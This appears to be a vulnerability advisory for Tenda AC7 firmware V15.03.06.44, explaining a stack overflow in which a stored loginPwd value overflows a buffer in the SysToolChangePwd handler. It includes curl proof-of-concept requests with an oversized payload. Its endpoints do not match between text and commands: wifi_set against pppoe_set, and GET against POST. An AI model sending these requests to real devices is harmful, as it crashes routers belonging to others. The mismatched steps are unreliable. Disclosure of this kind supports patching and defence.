## Summary

Tenda AC7 firmware **V15.03.06.44** contains a stack-overflow vulnerability in the Wi-Fi fast-setup flow. The `POST /goform/fast_setting_wifi_set` handler stores the user-supplied `loginPwd` directly into configuration under the key `sys.userpass` via `SetValue`Function. That stored value is later retrieved by `GET /goform/SysToolChangePwd` through `GetValue` Function and copied into a fixed-size stack buffer without sufficient bounds checking. Because there is no length or content validation when storing or retrieving the value, an attacker-controlled `loginPwd` can overflow the stack buffer when read — causing crashes and, under certain conditions, enabling control-flow hijacking.

## Affected product & version

- Product: Tenda AC7
- Affected firmware: **V15.03.06.44**
- Vendor support/download page: https://www.tenda.com.cn/product/download/AC7.html

## Technical details

- **Write endpoint:** `POST /goform/fast_setting_wifi_set`

  - Reads POST parameter `loginPwd` into local variable `v5`.
  - Persists it with: `SetValue("sys.userpass", v5)`.

  ![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20251005_143545.png)

- **Read endpoint:** `GET /goform/SysToolChangePwd`

  - Retrieves the value with: `GetValue("sys.userpass", v6)`; `v6` is a fixed-size stack buffer.
  - The retrieval/copy operation does not enforce length checks, so a stored value longer than `v6` will overflow the buffer.

  ![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20251005_143658.png)

- **Root cause:** Neither `SetValue` nor `GetValue` validate or constrain stored values. Downstream code assumes the stored string fits expected buffer sizes and performs unsafe copies.

## Poc

1. Send a POST to `/goform/fast_setting_wifi_set` with a malicious `loginPwd` payload

```
curl -s -X POST \
  http://192.168.0.1/goform/fast_setting_pppoe_set \
  -d 'ssid=tendaac7' \
  -d 'wrlPassword=admin' \
  -d 'loginPwd=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
```

2. Trigger Stack Overflow Vulnerability through the `/goform/SysToolChangePwd` interface.

```
curl -s -X POST \
  http://192.168.0.1/goform/SysToolChangePwd
```

3. Successfully triggered attack

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20251005_091337.png)
